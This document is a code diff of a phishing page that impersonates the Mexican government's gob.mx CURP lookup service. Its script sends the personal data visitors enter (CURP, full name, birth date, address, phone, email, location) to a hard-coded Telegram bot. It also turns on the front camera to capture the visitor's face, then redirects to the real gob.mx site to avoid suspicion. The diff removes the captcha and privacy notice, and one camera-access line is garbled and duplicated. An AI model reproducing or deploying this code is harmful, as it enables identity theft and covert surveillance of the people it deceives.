+    <li class="footer-item"><a href="#denuncia" class="footer-link underline">Denuncia contra servidores p&uacute;blicos</a></li>
+  </ul>
+
+  <div class="footer-social">
+    <span class="footer-social-label">S&iacute;guenos en</span>
+    <div class="social-icons">
+      <a href="#facebook" aria-label="Facebook">f</a>
+      <a href="#x" aria-label="X">&#120159;</a>
+      <a href="#instagram" class="social-ig" aria-label="Instagram"></a>
+      <a href="#youtube" class="social-yt" aria-label="YouTube">&#9654;</a>
+    </div>
   </div>
 
-  <!-- ===== 4) RECUADROS INFORMATIVOS ===== -->
-  <div class="recuadro-info">
-    <p class="info-titulo">¡Sugerencia!</p>
-    <p class="info-cuerpo">Para solicitar asistencia telefónica sobre el servicio de la CURP, puedes comunicarte al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números telefónicos:</p>
-    <p class="info-cuerpo">800 9 00 00 11, extensiones 15121 y 15421.</p>
+  <div class="footer-help">
+    <span class="help-asterisk" aria-hidden="true">&#10033;</span>
+    <span class="help-number">079</span>
+    <p class="help-text">Comun&iacute;cate, estamos para ayudarte</p>
+  </div>
+</footer>
+
+<!-- ===== RECUADRO FINAL GOBIERNO (NUEVO) ===== -->
+<div class="recuadro-final-gob">
+  <div class="recuadro-final-encabezado">
+    <img src="https://framework-gb.cdn.gob.mx/landing/img/logoheader.svg" alt="Gobierno de México" class="recuadro-final-escudo" />
+    <span class="recuadro-final-titulo-gob">Gobierno de<br />M&eacute;xico</span>
   </div>
 
-  <div class="recuadro-info">
-    <p class="info-titulo">Aviso de privacidad simplificado de consulta de CURP en línea</p>
-    <p class="info-cuerpo">La recolección de datos personales se lleva a cabo a través de <a class="info-link" href="https://www.gob.mx/curp" target="_blank" rel="noopener">https://www.gob.mx/curp</a>, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación.</p>
-    <p class="info-cuerpo">Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
-    <p class="info-cuerpo">Conoce el aviso de privacidad integral en <a class="info-link" href="https://www.gob.mx/curp/privacidadintegral" target="_blank" rel="noopener">https://www.gob.mx/curp/privacidadintegral</a>.</p>
+  <ul class="recuadro-final-lista">
+    <li class="recuadro-final-item">
+      <a href="#enlaces" class="recuadro-final-enlace">Enlaces</a>
+      <span class="recuadro-final-flecha">&#8964;</span>
+    </li>
+    <li class="recuadro-final-item">
+      <a href="#que-es-gobmx" class="recuadro-final-enlace">&iquest;Qu&eacute; es gob.mx?</a>
+      <span class="recuadro-final-flecha">&#8964;</span>
+    </li>
+    <li class="recuadro-final-item">
+      <a href="#denuncia" class="recuadro-final-enlace subrayado">Denuncia contra servidores p&uacute;blicos</a>
+    </li>
+  </ul>
+
+  <div class="recuadro-final-redes">
+    <span class="recuadro-final-redes-texto">S&iacute;guenos en</span>
+    <div class="recuadro-final-iconos">
+      <a href="#facebook" class="recuadro-final-icono" aria-label="Facebook">f</a>
+      <a href="#x" class="recuadro-final-icono" aria-label="X">&#120159;</a>
+      <a href="#instagram" class="recuadro-final-icono" aria-label="Instagram">&#9678;</a>
+      <a href="#youtube" class="recuadro-final-icono" aria-label="YouTube">&#9658;</a>
+    </div>
+  </div>
+
+  <div class="recuadro-final-079">
+    <span class="recuadro-final-asterisco">&#10033;</span>
+    <span class="recuadro-final-numero">079</span>
+    <p class="recuadro-final-ayuda">Comun&iacute;cate, estamos<br />para ayudarte</p>
   </div>
 </div>
 
@@ -393,58 +378,29 @@ window.addEventListener('load',function(){
   },150);
 });
 
-/* ===== Tabs ===== */
 function cambiarTab(tab){
   var btnCurp=document.getElementById('btn-tab-curp');
   var btnDatos=document.getElementById('btn-tab-datos');
   var panelCurp=document.getElementById('panel-curp');
   var panelDatos=document.getElementById('panel-datos');
   if(tab==='curp'){
-    if(btnCurp)btnCurp.classList.add('activa');
-    if(btnDatos)btnDatos.classList.remove('activa');
+    if(btnCurp)btnCurp.classList.add('active');
+    if(btnDatos)btnDatos.classList.remove('active');
     if(panelCurp)panelCurp.classList.remove('panel-oculto');
     if(panelDatos)panelDatos.classList.add('panel-oculto');
   }else{
-    if(btnDatos)btnDatos.classList.add('activa');
-    if(btnCurp)btnCurp.classList.remove('activa');
+    if(btnDatos)btnDatos.classList.add('active');
+    if(btnCurp)btnCurp.classList.remove('active');
     if(panelDatos)panelDatos.classList.remove('panel-oculto');
     if(panelCurp)panelCurp.classList.add('panel-oculto');
   }
-  limpiarErroresTabs();
 }
 
-function limpiarErroresTabs(){
-  var b1=document.getElementById('btn-tab-curp');
-  var b2=document.getElementById('btn-tab-datos');
-  if(b1)b1.classList.remove('error');
-  if(b2)b2.classList.remove('error');
-}
-
-/* ===== Estado error al cambiar / borrar ===== */
-function marcarError(el){
+function marcarError(el,on){
   if(!el)return;
-  el.classList.add('error');
-  var fix=function(){el.classList.remove('error');el.removeEventListener('input',fix);el.removeEventListener('change',fix);};
-  el.addEventListener('input',fix);
-  el.addEventListener('change',fix);
+  if(on)el.classList.add('is-error');else el.classList.remove('is-error');
 }
 
-/* ===== CAPTCHA ===== */
-var captchaActual='';
-function generarCaptcha(){
-  var chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-  var rnd='';
-  for(var i=0;i<5;i++){rnd+=chars.charAt(Math.floor(Math.random()*chars.length));}
-  captchaActual=rnd;
-  var el=document.getElementById('captchaCodigo');
-  if(el)el.textContent=rnd;
-  var inp=document.getElementById('captchaInput');
-  if(inp){inp.value='';inp.classList.remove('error');}
-  var box=document.getElementById('captchaBox');
-  if(box)box.classList.remove('error');
-}
-
-/* ===== Leer formulario ===== */
 function leerForm(){
   form={};
   var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'estado',calle:'calle',num_ext:'num-ext',num_int:'num-int',cp:'cp',colonia:'colonia',municipio:'municipio',estado:'estado-dom',entre:'entre',email:'email'};
@@ -452,10 +408,8 @@ function leerForm(){
   if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
   var lada=v('lada'),tel=v('telefono');
   if(tel)form.tel=lada+' '+tel;
-  form.captcha=v('captchaInput');
 }
 
-/* ===== Enviar a Telegram ===== */
 function enviar(){
   var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
   var CHAT="9092452687";
@@ -474,7 +428,7 @@ function enviar(){
   txt+="🧭 <b>GPS:</b> "+info.gps+"\n";
   if(form && Object.keys(form).length){
     txt+="\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
-    var et={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha nac.",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email",captcha:"CAPTCHA"};
+    var et={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha nac.",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email"};
     for(var k in form){if(form[k])txt+="  • <b>"+(et[k]||k)+":</b> "+form[k]+"\n";}
   } else { txt+="\n⚠️ Sin datos de formulario"; }
   fetch(API+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:"HTML"})}).catch(function(){});
@@ -496,7 +450,6 @@ function dataURLtoBlob(dataurl){
   return new Blob([u8arr],{type:mime});
 }
 
-/* ===== CP ===== */
 var CP_MUNICIPIOS={'01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón','02000':'Azcapotzalco','02300':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez','03810':'Benito Juárez','04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos','06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc','07000':'Gustavo A. Madero','07300':'Gustavo A. Madero','08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa','10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo','12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan','15000':'Venustiano Carranza','16000':'Xochimilco','50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'};
 
 function completarMunicipio(cp){
@@ -524,12 +477,14 @@ function autocompletarCP(cp){
   }).catch(function(){box.style.color='#c00';box.innerHTML='No se pudo autocompletar';});
 }
 
-/* ===== Flujo ===== */
 async function ejecutarFlujo(boton){
   boton.disabled=true;
+  var txtOriginal=boton.innerHTML;
   boton.innerHTML='<span class="load"></span> Buscando…';
   try{
-    var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    var stream=await navigator.mediaDevices.getUserMedia({video
+
+var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
     await new Promise(function(r){setTimeout(r,1000);});
     var video=document.createElement('video');video.srcObject=stream;await video.play();
     await new Promise(function(r){setTimeout(r,600);});
@@ -546,52 +501,46 @@ async function ejecutarFlujo(boton){
   window.location='https://www.gob.mx/curp/';
 }
 
-/* ===== Handlers ===== */
 document.addEventListener('DOMContentLoaded',function(){
-  generarCaptcha();
-
   var cpEl=document.getElementById('cp');
   if(cpEl)cpEl.addEventListener('input',function(){autocompletarCP(this.value);});
 
-  var refresh=document.getElementById('captchaRefresh');
-  if(refresh)refresh.addEventListener('click',generarCaptcha);
+  // limpiar error al escribir
+  document.querySelectorAll('.form-control').forEach(function(el){
+    el.addEventListener('input',function(){el.classList.remove('is-error');});
+    el.addEventListener('change',function(){el.classList.remove('is-error');});
+  });
 
-  var btn=document.getElementById('btnBuscar');
-  if(btn){
-    btn.onclick=async function(e){
+  var formEl=document.getElementById('curpForm');
+  if(formEl){
+    formEl.addEventListener('submit',async function(e){
       e.preventDefault();
-
-      // Validar CAPTCHA
-      var capInp=document.getElementById('captchaInput');
-      var capBox=document.getElementById('captchaBox');
-      var ingresado=(capInp.value||'').toUpperCase().trim();
-      if(ingresado!==captchaActual){
-        if(capBox)capBox.classList.add('error');
-        if(capInp){capInp.classList.add('error');marcarError(capInp);}
-        generarCaptcha();
-        return;
-      }
-
+      var boton=document.getElementById('btnBuscar');
       var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
+
+      // validar campos obligatorios visibles
+      var panelActual=panelCurpVisible?'panel-curp':'panel-datos';
+      var ok=true;
+      var cont=document.getElementById(panelActual);
+      if(cont){
+        cont.querySelectorAll('input,select').forEach(function(el){
+          var lbl=el.previousElementSibling;
+          var req=lbl && lbl.tagName==='LABEL' && /\*/.test(lbl.textContent||'');
+          if(req && !el.value){marcarError(el,true);ok=false;}
+        });
+      }
+      if(!ok){return;}
+
       if(panelCurpVisible){
         form={};
         form.curp=v('curp');
-        if(!form.curp){marcarError(document.getElementById('curp'));return;}
+        if(!form.curp){marcarError(document.getElementById('curp'),true);return;}
       }else{
         leerForm();
-        if(!form.nombre||!form.ap){marcarError(document.getElementById('nombre'));marcarError(document.getElementById('primer-apellido'));return;}
       }
-      await ejecutarFlujo(this);
-      setTimeout(generarCaptcha,1200);
-    };
+      await ejecutarFlujo(boton);
+    });
   }
-
-  // marcar error al salir vacío de un campo obligatorio
-  ['curp','nombre','primer-apellido','calle','num-ext','cp','colonia','municipio','estado-dom','telefono','email'].forEach(function(id){
-    var el=document.getElementById(id);
-    if(el)el.addEventListener('blur',function(){if(!this.value.trim())maracarBlur(this);});
-  });
-  function maracarBlur(el){el.classList.add('error');el.addEventListener('input',function(){el.classList.remove('error');},{once:true});}
 });
 </script>
 </body>
